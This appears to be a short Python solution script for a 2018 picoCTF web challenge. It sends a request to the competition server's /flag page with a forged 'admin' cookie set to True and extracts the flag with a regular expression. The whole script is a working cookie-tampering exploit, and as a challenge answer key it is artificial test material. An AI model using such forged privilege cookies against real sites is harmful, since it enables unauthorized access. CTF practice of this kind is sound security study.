#!/usr/bin/env python
import requests
import re

req = requests.get('http://2018shell.picoctf.com:62746/flag', cookies={'admin': 'True'})

print(re.search(r'picoCTF{.+}',req.text)[0])